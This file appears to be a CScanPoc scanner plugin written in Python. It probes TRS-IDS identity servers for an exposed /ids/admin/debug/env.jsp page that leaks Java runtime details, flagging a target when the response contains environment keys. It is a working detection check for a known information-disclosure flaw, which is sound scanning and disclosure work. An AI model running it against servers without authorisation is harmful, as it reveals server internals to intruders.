# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TRS-IDS_0003'  # 平台漏洞编号，留空
    name = '拓尔思身份服务器系统 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2013-10-15'  # 漏洞公布时间
    desc = '''
        拓尔思身份服务器系统实现各种应用系统间跨域的单点登录和统一的身份管理功能。提供与第三方协作应用系统集成的框架以及非常便捷的二次开发接口。
        拓尔思身份服务器系统 /ids/admin/debug/env.jsp 存在信息泄露漏洞。
    '''  # 漏洞描述
    ref = 'http://reboot.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TRS-IDS(拓尔思身份服务器系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '15a909c4-47ab-4793-9914-9cc46929cf2e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2013-039729
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/ids/admin/debug/env.jsp'
            code, head, res, err, _ = hh.http(url)
            # print code, res
            if(code == 200) and ('JavaHome' in res) and 'java.runtime.name' in res and 'java.vm.version' in res:
                #security_info('Info Disclosure: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
